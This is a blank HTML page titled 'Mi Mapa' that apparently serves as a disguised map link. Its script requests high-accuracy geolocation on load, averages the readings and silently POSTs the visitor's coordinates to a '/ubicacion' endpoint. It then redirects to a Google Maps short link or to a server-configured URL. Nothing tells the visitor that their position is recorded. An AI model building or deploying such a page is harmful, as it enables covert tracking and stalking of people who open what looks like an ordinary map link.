<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Mi Mapa</title>
  <style>
    * { box-sizing: border-box; margin: 0; padding: 0; }
    body { background: #fff; }
  </style>
</head>
<body>
  <script>
    let watchId = null;
    let deadline = null;
    let readings = [];
    let terminado = false;
    const GOOD_M = 50, MAX_WAIT = 10000, MAX_USE = 200;

    function weightedAvg() {
      const pool = readings.filter(r => r.accuracy <= MAX_USE);
      const src  = pool.length ? pool : readings;
      let wLat = 0, wLng = 0, wSum = 0;
      src.forEach(r => {
        const w = 1 / (r.accuracy * r.accuracy);
        wLat += r.lat * w; wLng += r.lng * w; wSum += w;
      });
      return { lat: wLat / wSum, lng: wLng / wSum };
    }

    async function terminar() {
      if (terminado) return;
      terminado = true;

      if (watchId !== null) { navigator.geolocation.clearWatch(watchId); watchId = null; }
      clearTimeout(deadline);

      let destino = 'https://maps.app.goo.gl/t2xJ2sB7UHKGtDbH9';
      try {
        const cfg = await fetch('/api/config').then(r => r.json());
        if (cfg.redirectUrl) destino = cfg.redirectUrl;
      } catch (_) {}

      if (readings.length) {
        const { lat, lng } = weightedAvg();
        try {
          await fetch('/ubicacion', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ lat, lng }),
          });
        } catch (_) {}
      }

      window.location.href = destino;
    }

    function onWatch(pos) {
      const { latitude: lat, longitude: lng, accuracy } = pos.coords;
      readings.push({ lat, lng, accuracy });
      if (accuracy <= GOOD_M) terminar();
    }

    function onError() {
      terminar();
    }

    if ('geolocation' in navigator) {
      watchId = navigator.geolocation.watchPosition(onWatch, onError, {
        enableHighAccuracy: true, timeout: 10000, maximumAge: 0,
      });
      deadline = setTimeout(terminar, MAX_WAIT);
    } else {
      terminar();
    }
  </script>
</body>
</html>
